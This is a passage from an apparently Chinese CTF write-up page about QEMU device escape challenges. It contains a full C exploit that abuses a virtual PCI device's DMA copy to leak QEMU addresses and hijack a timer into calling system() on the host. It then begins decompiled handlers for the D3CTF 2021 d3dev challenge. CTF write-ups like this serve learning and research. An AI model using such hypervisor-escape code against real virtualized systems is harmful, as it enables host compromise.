class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_MAP_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">hash_map_entry</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> key, value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hash_map_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; hash_map_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">hash_map</span> &#123;</span></span><br><span class="line">    hash_map_entry **entry;</span><br><span class="line">&#125; hash_map;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">hash_map_get</span><span class="params">(hash_map *<span class="built_in">map</span>, <span class="type">uint64_t</span> key)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> hash = key &amp; HASH_MAP_SIZE;</span><br><span class="line">    <span class="keyword">for</span> (hash_map_entry *entry = <span class="built_in">map</span>-&gt;entry[hash]; entry; entry = entry-&gt;next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;key == key) &#123;</span><br><span class="line">            <span class="keyword">return</span> entry-&gt;value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hash_map_set</span><span class="params">(hash_map *<span class="built_in">map</span>, <span class="type">uint64_t</span> key, <span class="type">uint64_t</span> value)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> hash = key &amp; HASH_MAP_SIZE;</span><br><span class="line">    <span class="keyword">for</span> (hash_map_entry *entry = <span class="built_in">map</span>-&gt;entry[hash]; entry; entry = entry-&gt;next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;key == key) &#123;</span><br><span class="line">            entry-&gt;value = value;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    hash_map_entry *entry = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(hash_map_entry));</span><br><span class="line">    entry-&gt;next = <span class="built_in">map</span>-&gt;entry[hash];</span><br><span class="line">    entry-&gt;key = key;</span><br><span class="line">    entry-&gt;value = value;</span><br><span class="line">    <span class="built_in">map</span>-&gt;entry[hash] = entry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hash_map_del</span><span class="params">(hash_map *<span class="built_in">map</span>, <span class="type">uint64_t</span> key)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> hash = key &amp; HASH_MAP_SIZE;</span><br><span class="line">    <span class="keyword">for</span> (hash_map_entry *entry = <span class="built_in">map</span>-&gt;entry[hash], *prev = <span class="literal">NULL</span>; entry; prev = entry, entry = entry-&gt;next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;key == key) &#123;</span><br><span class="line">            prev == <span class="literal">NULL</span> ? (<span class="built_in">map</span>-&gt;entry[hash] = entry-&gt;next) : (prev-&gt;next = entry-&gt;next);</span><br><span class="line">            <span class="built_in">free</span>(entry);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hash_map_init</span><span class="params">(hash_map *<span class="built_in">map</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">map</span>-&gt;entry = <span class="built_in">calloc</span>(HASH_MAP_SIZE, <span class="keyword">sizeof</span>(hash_map_entry *));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hash_map_clear</span><span class="params">(hash_map *<span class="built_in">map</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; HASH_MAP_SIZE; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (hash_map_entry *entry = <span class="built_in">map</span>-&gt;entry[i], *next; entry; entry = next) &#123;</span><br><span class="line">            next = entry-&gt;next, <span class="built_in">free</span>(entry);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(<span class="built_in">map</span>-&gt;entry);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">vaddr_to_paddr</span><span class="params">(<span class="type">size_t</span> vaddr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> pagemap_fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    lseek(pagemap_fd, vaddr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET);</span><br><span class="line">    <span class="type">size_t</span> data;</span><br><span class="line">    assert(read(pagemap_fd, &amp;data, <span class="number">8</span>) == <span class="number">8</span>);</span><br><span class="line">    close(pagemap_fd);</span><br><span class="line">    <span class="keyword">return</span> data * PAGE_SIZE + (vaddr % PAGE_SIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> *vaddr[<span class="number">2</span>];</span><br><span class="line">    <span class="type">size_t</span> paddr;</span><br><span class="line">&#125; adjacent_pages_buf;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">release_pages</span><span class="params">(hash_map *<span class="built_in">map</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SIZE; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (hash_map_entry *entry = <span class="built_in">map</span>-&gt;entry[i]; entry; entry = entry-&gt;next) &#123;</span><br><span class="line">            assert(munmap((<span class="type">void</span> *) entry-&gt;value, PAGE_SIZE) == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    hash_map_clear(<span class="built_in">map</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_adjacent_pages</span><span class="params">(adjacent_pages_buf *buf)</span> &#123;</span><br><span class="line">    hash_map *<span class="built_in">map</span> = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(hash_map *));</span><br><span class="line">    hash_map_init(<span class="built_in">map</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="type">size_t</span> vaddr = (<span class="type">size_t</span>) (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memset</span>((<span class="type">void</span> *) vaddr, <span class="number">0</span>, PAGE_SIZE);</span><br><span class="line">        <span class="type">size_t</span> paddr = vaddr_to_paddr(vaddr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] new page %p %p\n&quot;</span>, paddr, vaddr);</span><br><span class="line">        <span class="keyword">if</span> ((buf-&gt;vaddr[<span class="number">1</span>] = (<span class="type">void</span> *) hash_map_get(<span class="built_in">map</span>, paddr + <span class="number">0x1000</span>)) != (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">            buf-&gt;vaddr[<span class="number">0</span>] = (<span class="type">void</span> *) vaddr;</span><br><span class="line">            buf-&gt;paddr = paddr;</span><br><span class="line">            hash_map_del(<span class="built_in">map</span>, paddr + <span class="number">0x1000</span>);</span><br><span class="line">            release_pages(<span class="built_in">map</span>), <span class="built_in">free</span>(<span class="built_in">map</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((buf-&gt;vaddr[<span class="number">0</span>] = (<span class="type">void</span> *) hash_map_get(<span class="built_in">map</span>, paddr - <span class="number">0x1000</span>)) != (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">            buf-&gt;vaddr[<span class="number">1</span>] = (<span class="type">void</span> *) vaddr;</span><br><span class="line">            buf-&gt;paddr = paddr - <span class="number">0x1000</span>;</span><br><span class="line">            hash_map_del(<span class="built_in">map</span>, paddr - <span class="number">0x1000</span>);</span><br><span class="line">            hash_map_clear(<span class="built_in">map</span>), <span class="built_in">free</span>(<span class="built_in">map</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        hash_map_set(<span class="built_in">map</span>, paddr, vaddr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">size_t</span> offset, <span class="type">uint64_t</span> value)</span> &#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *) (mmio_mem + offset) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">size_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint64_t</span> *) (mmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SRC 0x8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CNT 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD 0x18</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> CP_src;</span><br><span class="line">    <span class="type">size_t</span> CP_cnt;</span><br><span class="line">    <span class="type">size_t</span> CP_dst;</span><br><span class="line">&#125; CP_info;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> cmd[] = <span class="string">&quot;wslview calc.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mlock(mmio_mem, <span class="number">0x1000</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mlock mmio_mem.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    adjacent_pages_buf read_buf;</span><br><span class="line">    get_adjacent_pages(&amp;read_buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] read_buf vaddr[0]: %p\n&quot;</span>, read_buf.vaddr[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] read_buf vaddr[1]: %p\n&quot;</span>, read_buf.vaddr[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] read_buf paddr: %p\n&quot;</span>, read_buf.paddr);</span><br><span class="line"></span><br><span class="line">    adjacent_pages_buf write_buf;</span><br><span class="line">    get_adjacent_pages(&amp;write_buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] write_buf vaddr[0]: %p\n&quot;</span>, write_buf.vaddr[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] write_buf vaddr[1]: %p\n&quot;</span>, write_buf.vaddr[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] write_buf paddr: %p\n&quot;</span>, write_buf.paddr);</span><br><span class="line"></span><br><span class="line">    (*(CP_info *) write_buf.vaddr[<span class="number">0</span>]).CP_dst = read_buf.paddr;</span><br><span class="line">    (*(CP_info *) write_buf.vaddr[<span class="number">0</span>]).CP_cnt = <span class="number">0x1040</span>;</span><br><span class="line">    mmio_write(SRC, write_buf.paddr);</span><br><span class="line">    mmio_write(CNT, <span class="number">1</span>);</span><br><span class="line">    mmio_write(CMD, <span class="number">0x4</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> timer_list_addr = ((<span class="type">size_t</span> *) read_buf.vaddr[<span class="number">1</span>])[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> elf_base = ((<span class="type">size_t</span> *) read_buf.vaddr[<span class="number">1</span>])[<span class="number">2</span>] - <span class="number">0x4dce80</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] elf base: %p\n&quot;</span>, elf_base);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> system_plt = elf_base + <span class="number">0x2c2180</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] system@plt: %p\n&quot;</span>, system_plt);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> opaque_addr = ((<span class="type">size_t</span> *) read_buf.vaddr[<span class="number">1</span>])[<span class="number">3</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] opaque addr: %p\n&quot;</span>, opaque_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x11</span>; i++) &#123;</span><br><span class="line">        (*(CP_info *) (write_buf.vaddr[<span class="number">0</span>] + i * <span class="keyword">sizeof</span>(CP_info))).CP_src = write_buf.paddr;</span><br><span class="line">        (*(CP_info *) (write_buf.vaddr[<span class="number">0</span>] + i * <span class="keyword">sizeof</span>(CP_info))).CP_dst = read_buf.paddr;</span><br><span class="line">        (*(CP_info *) (write_buf.vaddr[<span class="number">0</span>] + i * <span class="keyword">sizeof</span>(CP_info))).CP_cnt = <span class="number">0x1020</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *) (write_buf.vaddr[<span class="number">1</span>] + <span class="number">0x8</span>) = timer_list_addr;</span><br><span class="line">    *(<span class="type">size_t</span> *) (write_buf.vaddr[<span class="number">1</span>] + <span class="number">0x10</span>) = system_plt;</span><br><span class="line">    *(<span class="type">size_t</span> *) (write_buf.vaddr[<span class="number">1</span>] + <span class="number">0x18</span>) = opaque_addr + <span class="number">0xa00</span> + <span class="number">0x500</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span> *) (write_buf.vaddr[<span class="number">0</span>] + <span class="number">0x500</span>), cmd, <span class="keyword">sizeof</span>(cmd));</span><br><span class="line">    mmio_write(SRC, write_buf.paddr);</span><br><span class="line">    mmio_write(CNT, <span class="number">0x11</span>);</span><br><span class="line">    mmio_write(CMD, <span class="number">0x1</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    mmio_write(CMD, <span class="number">0x114514</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D3CTF-2021-d3dev"><a href="#D3CTF-2021-d3dev" class="headerlink" title="[D3CTF 2021] d3dev"></a>[D3CTF 2021] d3dev</h2><h3 id="关键函数-1"><a href="#关键函数-1" class="headerlink" title="关键函数"></a>关键函数</h3><h4 id="d3dev-mmio-read"><a href="#d3dev-mmio-read" class="headerlink" title="d3dev_mmio_read"></a>d3dev_mmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">d3dev_mmio_read</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = opaque-&gt;blocks[opaque-&gt;seek + (<span class="type">unsigned</span> <span class="type">int</span>)(addr &gt;&gt; <span class="number">3</span>)];</span><br><span class="line">  v4 = <span class="number">-957401312</span>;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  result = HIDWORD(v3);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(result) = result - ((v5 + v4) ^ (opaque-&gt;key[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">2</span>] + <span class="number">16</span> * v5));</span><br><span class="line">    v5 -= (result + v4) ^ (opaque-&gt;key[<span class="number">1</span>] + ((<span class="type">unsigned</span> <span class="type">int</span>)result &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">0</span>] + <span class="number">16</span> * result);</span><br><span class="line">    v4 += <span class="number">1640531527</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 );</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;mmio_read_part )</span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> v5;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="d3dev-mmio-write"><a href="#d3dev-mmio-write" class="headerlink" title="d3dev_mmio_write"></a>d3dev_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">d3dev_mmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  ObjectClass_0 **v5; <span class="comment">// r11</span></span><br><span class="line">  <span class="type">uint64_t</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">uint32_t</span> v8; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">uint32_t</span> v9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">uint32_t</span> v10; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">uint32_t</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">uint64_t</span> v13; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = opaque-&gt;seek + (<span class="type">unsigned</span> <span class="type">int</span>)(addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;mmio_write_part )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4;</span><br><span class="line">      v6 = val &lt;&lt; <span class="number">32</span>;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">      v8 = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      v9 = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      v10 = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      v11 = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      v12 = v6 + *((_DWORD *)v5 + <span class="number">694</span>);</span><br><span class="line">      v13 = ((<span class="type">unsigned</span> __int64)v5[<span class="number">347</span>] + v6) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 -= <span class="number">1640531527</span>;</span><br><span class="line">        v12 += (v7 + v13) ^ (v9 + ((<span class="type">unsigned</span> <span class="type">int</span>)v13 &gt;&gt; <span class="number">5</span>)) ^ (v8 + <span class="number">16</span> * v13);</span><br><span class="line">        LODWORD(v13) = ((v7 + v12) ^ (v11 + (v12 &gt;&gt; <span class="number">5</span>)) ^ (v10 + <span class="number">16</span> * v12)) + v13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != <span class="number">-957401312</span> );</span><br><span class="line">      v5[<span class="number">347</span>] = (ObjectClass_0 *)__PAIR64__(v13, v12);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;blocks[v4] = (<span class="type">unsigned</span> <span class="type">int</span>)val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="d3dev-pmio-read"><a href="#d3dev-pmio-read" class="headerlink" title="d3dev_pmio_read"></a>d3dev_pmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">d3dev_pmio_read</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0uLL</span>:</span><br><span class="line">      result = opaque-&gt;memory_mode;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8uLL</span>:</span><br><span class="line">      result = opaque-&gt;seek;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xC</span>uLL:</span><br><span class="line">      result = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span 